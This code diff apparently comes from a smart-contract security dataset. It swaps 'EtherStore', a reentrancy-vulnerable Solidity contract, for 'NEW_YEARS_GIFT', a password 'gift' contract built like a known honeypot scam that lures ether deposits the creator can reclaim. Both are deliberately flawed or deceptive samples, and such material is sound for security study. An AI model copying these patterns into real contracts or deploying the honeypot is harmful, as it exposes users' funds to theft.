@@ -1,23 +1,69 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.18;
+pragma solidity ^0.4.19;
 
+contract NEW_YEARS_GIFT
+{
+    string message;
 
-contract EtherStore {
-    mapping(address => uint256) public balances;
+    bool passHasBeenSet = false;
 
-    function deposit() public payable {
-        balances[msg.sender] += msg.value;
+    address sender;
+
+    bytes32 public hashPass;
+
+    function() public payable{}
+
+    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
+
+    function SetPass(bytes32 hash)
+    public
+    payable
+    {
+        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
+        {
+            hashPass = hash;
+            sender = msg.sender;
+        }
     }
 
-    function withdrawFunds(uint256 _weiToWithdraw) public {
-        require(balances[msg.sender] >= _weiToWithdraw);
-        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
-        require(send, "send failed");
+    function SetMessage(string _message)
+    public
+    {
+        if(msg.sender==sender)
+        {
+            message =_message;
+        }
+    }
 
-        if (balances[msg.sender] >= _weiToWithdraw) {
-            balances[msg.sender] -= _weiToWithdraw;
+    function GetGift(bytes pass)
+    external
+    payable
+    returns (string)
+    {
+        if(hashPass == sha3(pass))
+        {
+            msg.sender.transfer(this.balance);
+            return message;
+        }
+    }
+
+    function Revoce()
+    public
+    payable
+    {
+        if(msg.sender==sender)
+        {
+            sender.transfer(this.balance);
+            message="";
+        }
+    }
+
+    function PassHasBeenSet(bytes32 hash)
+    public
+    {
+        if(msg.sender==sender&&hash==hashPass)
+        {
+           passHasBeenSet=true;
         }
     }
 }
-
-
